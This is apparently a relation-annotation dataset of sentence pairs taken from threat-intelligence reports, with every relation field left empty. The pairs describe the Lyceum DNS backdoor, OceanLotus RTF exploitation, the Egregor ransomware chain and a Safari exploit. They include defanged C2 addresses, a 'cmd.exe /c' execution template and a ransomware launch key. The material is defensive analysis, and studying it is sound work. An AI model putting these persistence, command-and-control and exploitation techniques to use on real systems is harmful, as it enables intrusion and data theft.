        "S1": "The text of the document is copied from the following original report here: https[:]//www[.]rferl[.]org/a/iran-drone-program-threats-interests/31660048.html",
        "S2": "Upon closing the document the AutoClose() function is executed, reading a PE file from the text box present on the 7th page of the word document and parsing it further into the required format as shown below with the \u201cMZ\u201d header as the initial two bytes of the byte stream.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S3<=>S6",
        "S1": "The threat actor then leverages the AutoClose() function to drop the DNS backdoor onto the system.",
        "S2": "With this tactic, whenever the system is restarted, the DNS Backdoor is executed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S5<=>S10",
        "S1": "This PE file is then further written into the Startup folder in order to maintain persistence via the macro code as shown below in the screenshot.",
        "S2": "As discussed earlier, the backdoor was dropped in the Startup folder of the infected system from a Macro Enabled Word document.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S6<=>S8",
        "S1": "With this tactic, whenever the system is restarted, the DNS Backdoor is executed.",
        "S2": "Below, we analyze the dropped .NET based DNS Backdoor and its inner workings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S7<=>S13",
        "S1": "The dropped binary is a .NET based DNS Backdoor named \u201cDnsSystem\u201d which allows the threat actors to execute system commands remotely and upload/download data on the infected machine.",
        "S2": "The threat actors have customized and appended code that allows them to perform DNS queries for various records onto the custom DNS Server, parse the response of the query in order to execute system commands remotely, and upload/download files from the Command & Control server by leveraging the DNS protocol.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S9<=>S11",
        "S1": "The Lyceum Group has developed a .NET based DNS Backdoor which has been widely used in the wild in their recent campaigns.",
        "S2": "The .NET based DNS Backdoor is a customized version of the Open source tool DIG.net (DnsDig) found here: DNS.NET Resolver (C#) - CodeProject .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S12<=>S23",
        "S1": "DIG.net is an open source DNS Resolver which can be leveraged to perform DNS queries onto the DNS Server and then parse the response.",
        "S2": "Comparing the Digit Resolver Code DigIt() function strings with the Dig.Net tool output from the screenshot shown below provides us further assurance that the Dig.Net tool has been customized by the Lyceum Group to develop the following .Net based DNS backdoor. .",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S15<=>S17",
        "S1": "Now this IP is associated as the custom attacker controlled DNS Server for all the further DNS queries initiated by the malware.",
        "S2": "It converts the username into its MD5 equivalent using the CreateMD5() function, and parses the first 8 bytes of the MD5 as the BotID for the identification of the user and system infected by the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S21<=>S36",
        "S1": "The BeginDigIt function then executes the main DNS resolver function \u201cDigIt.\u201d",
        "S2": "If the command received from the DNS query consists of a string: \u201cdownloaddd\u201d it initiates the download routine and downloads the file from the URL using DownloadFileAsync().",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S23<=>S28",
        "S1": "Comparing the Digit Resolver Code DigIt() function strings with the Dig.Net tool output from the screenshot shown below provides us further assurance that the Dig.Net tool has been customized by the Lyceum Group to develop the following .Net based DNS backdoor. .",
        "S2": "As can be seen in the above screenshot, a DNS query is performed to fetch the TXT records for the domain name: EF58DF5trailers.apple.com to the DNS Server: 85[.]206[.]175[.]199 which is the attacker-controlled DNS server previously initialized.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S23<=>S30",
        "S1": "Comparing the Digit Resolver Code DigIt() function strings with the Dig.Net tool output from the screenshot shown below provides us further assurance that the Dig.Net tool has been customized by the Lyceum Group to develop the following .Net based DNS backdoor. .",
        "S2": "Following is the DIG.Net DNS response received by the backdoor and then further parsed in order to execute commands on the infected machine.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S24<=>S26",
        "S1": "The malware utilizes a DNS attack technique known as \u201cDNS Hijacking\u201d where in the DNS server is being controlled by the attackers which would allow them to manipulate the response to the DNS queries.",
        "S2": "As discussed earlier, the backdoor performs initial DNS queries in order to fetch the TXT records for the domain EF58DF5trailers.apple.com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S26<=>S29",
        "S1": "As discussed earlier, the backdoor performs initial DNS queries in order to fetch the TXT records for the domain EF58DF5trailers.apple.com.",
        "S2": "Here\u2019s where the DNS hijacking happens: As the malware sends across a DNS query to fetch the TXT records to the attacker-controlled DNS server, the attacker controlled DNS server responds with an incorrect response consisting of the commands to be executed by the backdoor such as ipconfig,whoami,uploaddd etc as shown in the screenshot below.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S26<=>S28",
        "S1": "As discussed earlier, the backdoor performs initial DNS queries in order to fetch the TXT records for the domain EF58DF5trailers.apple.com.",
        "S2": "As can be seen in the above screenshot, a DNS query is performed to fetch the TXT records for the domain name: EF58DF5trailers.apple.com to the DNS Server: 85[.]206[.]175[.]199 which is the attacker-controlled DNS server previously initialized.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S27<=>S31",
        "S1": "EF58DF5 is the BotID generated based on the Windows user to receive commands from the C2 server.",
        "S2": "The above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S28<=>S31",
        "S1": "As can be seen in the above screenshot, a DNS query is performed to fetch the TXT records for the domain name: EF58DF5trailers.apple.com to the DNS Server: 85[.]206[.]175[.]199 which is the attacker-controlled DNS server previously initialized.",
        "S2": "The above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S29<=>S31",
        "S1": "Here\u2019s where the DNS hijacking happens: As the malware sends across a DNS query to fetch the TXT records to the attacker-controlled DNS server, the attacker controlled DNS server responds with an incorrect response consisting of the commands to be executed by the backdoor such as ipconfig,whoami,uploaddd etc as shown in the screenshot below.",
        "S2": "The above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S30<=>S33",
        "S1": "Following is the DIG.Net DNS response received by the backdoor and then further parsed in order to execute commands on the infected machine.",
        "S2": "Next, the Dig.net response is parsed using multiple pattern regex code routines which parse out the TXT record values\u2014the aforementioned command and communication ID\u2014from the complete response received by the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S31<=>S34",
        "S1": "The above screenshot consists of the DNS query performed to the attacker controlled DNS server along with the target domain name EF58DF5trailers.apple.com.",
        "S2": "Next, depending on the command received in the TXT record from the C2 server, there are three functions which can be performed by the Lyceum backdoor:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S34<=>S45",
        "S1": "Next, depending on the command received in the TXT record from the C2 server, there are three functions which can be performed by the Lyceum backdoor:",
        "S2": "In this case, the TXT record response we received for the DNS query performed against the attacker controlled DNS server is \u201cipconfig\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S34<=>S44",
        "S1": "Next, depending on the command received in the TXT record from the C2 server, there are three functions which can be performed by the Lyceum backdoor:",
        "S2": "There, the response to the txt record is executed as a command on the infected machine using \u201ccmd.exe /c <txt_record_response_command>\u201d and the command output is sent across to the C2 server in the form of DNS A Records.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S36<=>S40",
        "S1": "If the command received from the DNS query consists of a string: \u201cdownloaddd\u201d it initiates the download routine and downloads the file from the URL using DownloadFileAsync().",
        "S2": "If the command received from the DNS query consists of a string: \u201cuploaddd\u201d, it uploads the local file on the disk using UploadFileAsync() function to an External URL after parsing the TXT record response value into two variables: uriString (external URL) and filename (Local File).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S44<=>S47",
        "S1": "There, the response to the txt record is executed as a command on the infected machine using \u201ccmd.exe /c <txt_record_response_command>\u201d and the command output is sent across to the C2 server in the form of DNS A Records.",
        "S2": "Further, the command output is exfiltrated to the C2 server, encoded in Base64 and then concatenated with the Communication ID and the previously generated BotUID using \u201c$\u201d as the separator.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1025.md::S46<=>S48",
        "S1": "This response initiates the Command execution routine of the backdoor and thus the command \u201cipconfig\u201d would be executed on the infected machine - cmd.exe /c ipconfig",
        "S2": "Once the command output is encoded in the above mentioned pattern, the DNS backdoor then sends across the output to the C2 server via DNS query in the form of A records in multiple blocks of queries, where the A record values consists of the encoded command output.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S3<=>S6",
        "S1": "As seen in (Figure 2), at offset 0xC00 there is an EQNOLEFILEHDR structure, followed by the MTEF header and then an MTEF record (Figure 3) for a font.",
        "S2": "As seen in the RTF file content (offset 0xC26 in Figure 2), the buffer is filled with shellcode followed by a NOP (0x90) sled and the return address 0x402114.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S4<=>S56",
        "S1": "An overflow in the name field is possible because its size isn\u2019t checked before being copied.",
        "S2": "The content of the .db3 file is shellcode commonly used by OceanLotus.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S6<=>S8",
        "S1": "As seen in the RTF file content (offset 0xC26 in Figure 2), the buffer is filled with shellcode followed by a NOP (0x90) sled and the return address 0x402114.",
        "S2": "This results in EIP pointing at the beginning of the name field which contains the shellcode.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S8<=>S10",
        "S1": "This results in EIP pointing at the beginning of the name field which contains the shellcode.",
        "S2": "That is where the rest of the shellcode resides.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S12<=>S39",
        "S1": "First, the initial shellcode tries to find the handle of the open document file by iterating through all the system\u2019s handles (NtQuerySystemInformation with the SystemExtendedHandleInformation argument) and checking if the handle\u2019s PID matches the PID of a WinWord process and if the document was opened with the following access mask: 0x12019F.",
        "S2": "The value of the first one specifies how the malware will achieve persistence without administrator privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S14<=>S51",
        "S1": "Once it finds a match, the document is copied to a temporary folder (GetTempPath) as ole.dll.",
        "S2": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S19<=>S21",
        "S1": "The Python emulator script we released in March 2018 still works to dump the next stage.",
        "S2": "The code randomly selects the filename of an executable or DLL file located in C:\\Windows\\system32.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S19<=>S26",
        "S1": "The Python emulator script we released in March 2018 still works to dump the next stage.",
        "S2": "The stage\u2019s 0x102 resource is parsed and the files are dropped in either %ProgramFiles% or %AppData% in the randomly chosen folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S22<=>S24",
        "S1": "It will then query its resources and extract the FileDescription field to use as a folder name.",
        "S2": "It avoids using a name that may clash with existing files by making sure it does not contain: windows, Microsoft, desktop, system, system32 or syswow64.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S24<=>S54",
        "S1": "It avoids using a name that may clash with existing files by making sure it does not contain: windows, Microsoft, desktop, system, system32 or syswow64.",
        "S2": "This function simply creates a mutex starting with{181C8480-A975-411C-AB0A-630DB8B0A221}and followed by the current username.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S28<=>S34",
        "S1": "For example, here is a folder and a list of files created by picking the C:\\Windows\\system32\\TCPSVCS.exe executable as a source of data.",
        "S2": "The first file is dropped as TCPSVCS.exe which is in fact Adobe\u2019s legitimate AcroTranscoder.exe (according to its FileDescription, SHA-1: 2896738693A8F36CC7AD83EF1FA46F82F32BE5A3).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S34<=>S38",
        "S1": "The first file is dropped as TCPSVCS.exe which is in fact Adobe\u2019s legitimate AcroTranscoder.exe (according to its FileDescription, SHA-1: 2896738693A8F36CC7AD83EF1FA46F82F32BE5A3).",
        "S2": "The resource 0x101 of the dropper contains two 32-bit integers that dictate how the persistence should be implemented.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S34<=>S56",
        "S1": "The first file is dropped as TCPSVCS.exe which is in fact Adobe\u2019s legitimate AcroTranscoder.exe (according to its FileDescription, SHA-1: 2896738693A8F36CC7AD83EF1FA46F82F32BE5A3).",
        "S2": "The content of the .db3 file is shellcode commonly used by OceanLotus.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S37<=>S102",
        "S1": "It is possibly a way to evade detection by some security products.",
        "S2": "This probably means that they have some kind of \u201cbuilder\u201d that reuses the same templates and just changes some characteristics.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S38<=>S51",
        "S1": "The resource 0x101 of the dropper contains two 32-bit integers that dictate how the persistence should be implemented.",
        "S2": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S39<=>S85",
        "S1": "The value of the first one specifies how the malware will achieve persistence without administrator privileges.",
        "S2": "Ultimately, it drops db293b825dcc419ba7dc2c49fa2757ee.dll, loads it into memory and executes DllEntry.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S40<=>S45",
        "S1": "The value of the second integer specifies how the malware should try to achieve persistence if it runs with elevated privileges.",
        "S2": "Essentially, the malware creates a hidden task, sets the account information with the current user or the administrator information and sets the trigger.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S44<=>S46",
        "S1": "The scheduled task is created via several COM interfaces: ITaskScheduler, ITask, ITaskTrigger, IPersistFile and ITaskScheduler.",
        "S2": "This is a daily task with a duration of 24 hours and the interval between two executions is set to 10 minutes, which means it will run all the time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S45<=>S57",
        "S1": "Essentially, the malware creates a hidden task, sets the account information with the current user or the administrator information and sets the trigger.",
        "S2": "Again, we successfully unpacked its payload using the emulator script we published on GitHub.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S47<=>S57",
        "S1": "In our example, the executable TCPSVCS.exe (AcroTranscoder.exe) is legitimate software side-loading the DLLs that were dropped with it.",
        "S2": "Again, we successfully unpacked its payload using the emulator script we published on GitHub.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S49<=>S51",
        "S1": "Its DLLMain function just calls a single function.",
        "S2": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S51<=>S53",
        "S1": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:",
        "S2": "This means that, after loading the malicious DLL, when the runtime calls WinMain in TCPSVCS.exe, the instruction pointer will point to the NOP sled, which will eventually call FLVCore::Uninitialize(void), the next stage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S51<=>S80",
        "S1": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:",
        "S2": "Basically, the first time the DllRegisterServer is called, it sets the registry value HKCU\\SOFTWARE\\Classes\\CLSID\\{E08A0F4B-1F65-4D4D-9A09-BD4625B9C5A1}\\Model to an encoded offset in the DLL (0x10001DE0).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S51<=>S86",
        "S1": "After these deceptive checks, the code gets the .text section of TCPSVCS.exe, changes its protection to PAGE_EXECUTE_READWRITE and overwrites it with do-nothing instructions that have no side effects:",
        "S2": "The DLL retrieves the content of its resource, decrypts (AES-256-CBC) and decompresses it (LZMA).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S55<=>S73",
        "S1": "Then, it reads the dropped file with the .db3 extension, which contains position-independent code, and uses CreateThread to execute its content.",
        "S2": "This SFX file is cleverly crafted, as the description (Version Info) states it\u2019s a \u201cJPEG Image\u201d.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S56<=>S59",
        "S1": "The content of the .db3 file is shellcode commonly used by OceanLotus.",
        "S2": "This component is the backdoor that we already analysed in this white paper: OceanLotus: Old techniques, new backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S57<=>S84",
        "S1": "Again, we successfully unpacked its payload using the emulator script we published on GitHub.",
        "S2": "It can be emulated with our miasm emulation script.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S57<=>S61",
        "S1": "Again, we successfully unpacked its payload using the emulator script we published on GitHub.",
        "S2": "The configuration of the malware is still encrypted in a PE resource.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S59<=>S63",
        "S1": "This component is the backdoor that we already analysed in this white paper: OceanLotus: Old techniques, new backdoor.",
        "S2": "Once again OceanLotus showcases a large combination of techniques to stay under the radar.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S61<=>S75",
        "S1": "The configuration of the malware is still encrypted in a PE resource.",
        "S2": "The malware drops {9ec60ada-a200-4159-b310-8071892ed0c3}.ocx (SHA-1: EFAC23B0E6395B1178BCF7086F72344B24C04DCC) as well as the image 2018 thich thong lac.jpg.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S67<=>S70",
        "S1": "After using RTF files, the group started using self-extracting (SFX) archives that use common document icons in an attempt to further mislead their victims.",
        "S2": "Since the middle of January 2019, OceanLotus began reusing the technique but changed some configuration over time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S67<=>S69",
        "S1": "After using RTF files, the group started using self-extracting (SFX) archives that use common document icons in an attempt to further mislead their victims.",
        "S2": "When run, these self-extracting RAR files drop and execute DLL files (with a .ocx extension) with the final payload being the previously documented {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S68<=>S70",
        "S1": "It was briefly documented by Threatbook (in Chinese).",
        "S2": "Since the middle of January 2019, OceanLotus began reusing the technique but changed some configuration over time.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S71<=>S78",
        "S1": "This section will describe the technique and what they have altered to achieve their goal.",
        "S2": "The OCX file\u2019s control flow is very similar to other OceanLotus components: there are a lot of JZ/JNZ and PUSH/RET instruction sequences interleaved with junk code.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S72<=>S75",
        "S1": "The document THICH-THONG-LAC-HANH-THAP-THIEN-VIET-NAM (1).EXE (meaning \u201cFAVORITE RELATIONSHIP OF VIETNAMESE PERFORMANCE\u201d according to Google Translate, SHA-1: AC10F5B1D5ECAB22B7B418D6E98FA18E32BBDEAB) was first seen in 2018.",
        "S2": "The malware drops {9ec60ada-a200-4159-b310-8071892ed0c3}.ocx (SHA-1: EFAC23B0E6395B1178BCF7086F72344B24C04DCC) as well as the image 2018 thich thong lac.jpg.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S74<=>S77",
        "S1": "The script of the SFX is the following:",
        "S2": "You may have noticed the first two lines in the SFX script invoke the OCX file twice, but it is not a mistake\u2026",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S75<=>S104",
        "S1": "The malware drops {9ec60ada-a200-4159-b310-8071892ed0c3}.ocx (SHA-1: EFAC23B0E6395B1178BCF7086F72344B24C04DCC) as well as the image 2018 thich thong lac.jpg.",
        "S2": "Since the discovery of the {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll backdoor and its public analysis by multiple researchers, we observed some changes in the malware\u2019s configuration data.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S78<=>S101",
        "S1": "The OCX file\u2019s control flow is very similar to other OceanLotus components: there are a lot of JZ/JNZ and PUSH/RET instruction sequences interleaved with junk code.",
        "S2": "Even though OceanLotus uses fake timestamps, it has been observed that the timestamp of the SFX and OCX files are always the same (0x57B0C36A (08/14/2016 @ 7:15pm UTC) and 0x498BE80F (02/06/2009 @ 7:34am UTC) respectively).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S84<=>S103",
        "S1": "It can be emulated with our miasm emulation script.",
        "S2": "Among the documents we analysed since early-2018, we saw different document names suggesting country-related targeting:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1040.md::S93<=>S95",
        "S1": "This file decrypts its only resource {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll, then loads that DLL and calls its only export, DllEntry.",
        "S2": "The structure of the configuration file is quite similar to the previous one.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S0<=>S6",
        "S1": "Since Egregor is a relatively new player in the game, not many incidents involving it are covered and detailed here, including information about the infection chain.",
        "S2": "This information will assist in the lateral movement phase and also in performing privilege escalation, as Egregor compromises Active Directory in order to become domain admin.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S4<=>S6",
        "S1": "Later in the attack, a CobaltStrike beacon is installed on the infected machine and the attack shifts to an interactive hacking operation.",
        "S2": "This information will assist in the lateral movement phase and also in performing privilege escalation, as Egregor compromises Active Directory in order to become domain admin.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S4<=>S12",
        "S1": "Later in the attack, a CobaltStrike beacon is installed on the infected machine and the attack shifts to an interactive hacking operation.",
        "S2": "After dropping the files needed for the attack, the attackers \u201cprepare the ground\u201d and undertake a final procedure meant to avoid detection and prevention.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S4<=>S11",
        "S1": "Later in the attack, a CobaltStrike beacon is installed on the infected machine and the attack shifts to an interactive hacking operation.",
        "S2": "CobaltStrike creates a service that runs an encoded PowerShell command that executes shellcode that creates connection to amajai-technologies[.]industries:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S5<=>S13",
        "S1": "The attacker uses tools for reconnaissance such as Adfind and Sharphound to gather information about users, groups, computers and so on.",
        "S2": "The attacker creates a Group Policy Object (GPO) to disable Windows Defender and tries to take down any anti-virus products.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S7<=>S9",
        "S1": "In this stage, after the malware settles on the victim\u2019s machine, it starts communications to the C2 in order to download additional components including scripts, DLLs and other files that will be used eventually to exfiltrate data and encrypt files.",
        "S2": "- A batch file that is used to run Bitsadmin and Rundll to download and execute the Egregor payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S9<=>S14",
        "S1": "- A batch file that is used to run Bitsadmin and Rundll to download and execute the Egregor payload.",
        "S2": "As described above, the operators of Egregor deploy the ransomware payload after collecting the sensitive information and setting the GPO to evade detection and prevention.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S14<=>S16",
        "S1": "As described above, the operators of Egregor deploy the ransomware payload after collecting the sensitive information and setting the GPO to evade detection and prevention.",
        "S2": "The Egregor payload can only be decrypted if the correct key is provided via command line argument to the Rundll32 process, which means that the file cannot be analyzed, either manually or using a sandbox, if the exact same command line that the attackers used to run the ransomware isn\u2019t provided.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S15<=>S17",
        "S1": "To deploy the ransomware, they execute the dropped batch file that, as mentioned, is used to download and execute the ransomware payload from a remote server:",
        "S2": "In order to execute the ransomware and decrypt the blob of code inside of it, the operators provide the batch file with the key \u201c-passegregor10\u201d which resolves in the ransomware running and encrypting files:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1074.md::S17<=>S19",
        "S1": "In order to execute the ransomware and decrypt the blob of code inside of it, the operators provide the batch file with the key \u201c-passegregor10\u201d which resolves in the ransomware running and encrypting files:",
        "S2": "For example, it renames a file named \u201cMy_files.zip\u201d to \u201cMy_files.zip.IAsnM\u201d, \u201cMy_files2.zip\u201d to \u201cMy_files2.zip.WZlF\u201d and so on.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S4<=>S8",
        "S1": "Below we outline our understanding of how the vulnerability affects Safari versions prior to 14.1.",
        "S2": "Below we explain the vulnerability that made the leakage of object addresses possible.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S6<=>S8",
        "S1": "Using these two functions, the exploit creates two arrays of different types that overlap in memory, and thus is able to set a value in one of them that is treated as a pointer when accessed using the other.",
        "S2": "Below we explain the vulnerability that made the leakage of object addresses possible.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S8<=>S11",
        "S1": "Below we explain the vulnerability that made the leakage of object addresses possible.",
        "S2": "We have extracted the relevant part of the code that enables the addrof primitive, which you can see in Figure 6.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S9<=>S37",
        "S1": "The exploit relies on a side effect caused by modifying an object property to be accessible via a \u201cgetter\u201d function while enumerating the object\u2019s properties in JIT-compiled code.",
        "S2": "To summarize, the Mach-O does the following:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S11<=>S14",
        "S1": "We have extracted the relevant part of the code that enables the addrof primitive, which you can see in Figure 6.",
        "S2": "The function will return a pointer to a JSCell object (to be more precise, a GetterSetter), which should never be accessible from the JavaScript code.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S11<=>S32",
        "S1": "We have extracted the relevant part of the code that enables the addrof primitive, which you can see in Figure 6.",
        "S2": "Our examination confirms Google\u2019s analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S14<=>S16",
        "S1": "The function will return a pointer to a JSCell object (to be more precise, a GetterSetter), which should never be accessible from the JavaScript code.",
        "S2": "This JSCell is then converted to a JSObject by calling the JavaScript Object function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S14<=>S18",
        "S1": "The function will return a pointer to a JSCell object (to be more precise, a GetterSetter), which should never be accessible from the JavaScript code.",
        "S2": "There is no implementation for converting a GetterSetter to a JSObject and the code will eventually fall back and assume its type is a Symbol.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S18<=>S28",
        "S1": "There is no implementation for converting a GetterSetter to a JSObject and the code will eventually fall back and assume its type is a Symbol.",
        "S2": "As explained by Google TAG, the JavaScript loads a Mach-O executable file in memory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S20<=>S23",
        "S1": "You may have noticed the assertion that the cell type is a Symbol before performing the cast in the code; however, the ASSERT macro in WebKit is compiled out of release builds.",
        "S2": "Its value is fetched from JavaScript using its toString method.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S20<=>S27",
        "S1": "You may have noticed the assertion that the cell type is a Symbol before performing the cast in the code; however, the ASSERT macro in WebKit is compiled out of release builds.",
        "S2": "The rest of the code allows bypassing mitigations, such as the Gigacage, and loads the next stage.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S24<=>S26",
        "S1": "The updated JavaScriptCore code now checks whether the object contains properties with GetterSetter after the property enumeration, before considering whether the object\u2019s attribute can be accessed \u201cquickly\u201d.",
        "S2": "In short, it abuses the same bug, although this time the object is manipulated in a way that the JIT-compiled code accesses an item that is out-of-bounds and returns an address that was carefully sprayed on the heap before the fetch.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S32<=>S34",
        "S1": "Our examination confirms Google\u2019s analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.",
        "S2": "Figure 7 shows a call to a function Tielei Wang called adjust_port_type in his last presentation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S32<=>S43",
        "S1": "Our examination confirms Google\u2019s analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.",
        "S2": "The decrypted payload is where our analysis differs the most from what was described by Google TAG: the payload delivered to vulnerable visitors to the D100 site was new macOS malware we\u2019ve named DazzleSpy.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S32<=>S35",
        "S1": "Our examination confirms Google\u2019s analysis that the exploited vulnerability was described by Xinru Chi and Tielei Wang in a presentation at zer0con 2021, but it was also presented in more details at MOSEC 2021 by Tielei Wang.",
        "S2": "This function, responsible for changing the internal type of a Mach port, is implemented the same way in the Mach-O as was presented at MOSEC.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S37<=>S46",
        "S1": "To summarize, the Mach-O does the following:",
        "S2": "In order to persist on the compromised device, the malware adds a Property List file (plist; see Figure 8) named com.apple.softwareupdate.plist to the LaunchAgents folder.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-1100.md::S43<=>S45",
        "S1": "The decrypted payload is where our analysis differs the most from what was described by Google TAG: the payload delivered to vulnerable visitors to the D100 site was new macOS malware we\u2019ve named DazzleSpy.",
        "S2": "Our sample is a Mach-O binary file compiled for x86_64 CPU architecture.",
        "relation": ""
